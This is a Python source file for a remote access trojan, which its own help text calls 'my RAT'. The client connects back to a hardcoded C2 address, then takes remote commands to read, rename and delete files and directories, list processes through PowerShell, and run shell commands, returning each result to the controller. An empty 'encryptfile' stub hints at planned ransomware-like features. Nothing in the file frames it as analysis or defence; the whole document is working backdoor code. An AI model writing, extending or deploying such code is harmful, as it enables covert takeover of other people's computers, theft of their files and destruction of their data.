
import socket
import subprocess
import os
import re


class ClientClass:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.curdir = os.getcwd()
        self.BUFFER_SIZE = 1024 * 128
        self.SEPARATOR = "\n\n"

    def connection(self):
        try:
            global client
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.ip, self.port))
            firstmassage = f'\n{self.curdir}>> '
            client.send(firstmassage.encode())
        except Exception as error:
            print(error)

    def encryptfile(self):
        pass

    def cexe(self):
        while True:
            # receive the commands
            command = client.recv(self.BUFFER_SIZE).decode()
            splited_command = command.split()

            if splited_command[0].lower() == "exit":
                client.close()

            elif splited_command[0].lower() == "man" or splited_command[0].lower() == "--help":
                output = """
                man page for my RAT:
                exit - Exit Shell
                cd - Change Directory
                ls - List Directory
                pwd - Working Directory
                cat - Show file content
                """
            elif splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except Exception as error:
                    # if there is an error, set as the output
                    output = str(error)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif splited_command[0].lower() == "rn":

                tgt_file = ''.join(splited_command[1])
                new_name = ''.join(splited_command[2])

                try:
                    os.rename(tgt_file, new_name)
                except Exception as error:
                    output = str(error)
                else:
                    output = "File got renamed"

            elif splited_command[0].lower() == "ls" and not splited_command[1:]:
                execute = os.listdir()
                string = ' '.join(execute)
                reg = re.sub("\s", "\n", string)
                output = reg

            elif splited_command[0].lower() == "pwd" and not splited_command[1:]:
                output = os.getcwd()

            elif splited_command[0].lower() == "rm":
                try:
                    os.remove(''.join(splited_command[1:]))
                except Exception as error:
                    output = str(error)
                else:
                    output = f'{splited_command[1:]} got removed'

            elif splited_command[0].lower() == "mkdir":
                os.mkdir(''.join(splited_command[1:]))
                output = f"New Directory {splited_command[1:]} created"

            elif splited_command[0].lower() == "rmdir":
                try:
                    os.rmdir(''.join(splited_command[1:]))
                except Exception as error:
                    output = str(error)
                else:
                    output = f'Directory {splited_command[1:]} Got Deleted'

            elif splited_command[0].lower() == "cat":
                y = ' '.join(splited_command[1:])
                try:
                    with open(y) as f:
                        x = f.readlines()
                        c = ' '.join(x)
                        r = re.sub("\n", "\n", c)
                        output = r
                except Exception as error:
                    output = str(error)

            elif splited_command[0].lower() == "proclist":
                if not splited_command[1:]:
                    output = subprocess.check_output(['powershell.exe',
                                                      'Get-Process'],
                                                     encoding='utf-8')

                elif splited_command[1] == "-pid":
                    output = subprocess.check_output(['powershell.exe',
                                                      'Get-Process',
                                                      '-PID',
                                                      ''.join(splited_command[2:])],
                                                     encoding='utf-8')

                else:
                    output = "Hint: proclist -pid <process id> "

            elif splited_command[0].lower() == "shell":
                a = "Starting Interactive CMD Shell, Enter 'end' to Break out."
                client.send(a.encode())
                output = subprocess.getoutput(command)

            else:
                # execute the command and retrieve the results
                # output = subprocess.getoutput(command)
                output = f"{command} Is Not A Valid Command, Try man/--help To See More Details."

            # get current working directory
            cwd = os.getcwd()
            # send the results to C2
            message = f"{output}{self.SEPARATOR}{cwd}>> "
            client.send(message.encode())
        # close client connection
        client.close()


rat = ClientClass('10.211.55.7', 5555)


if __name__ == '__main__':
    rat.connection()
    rat.cexe()
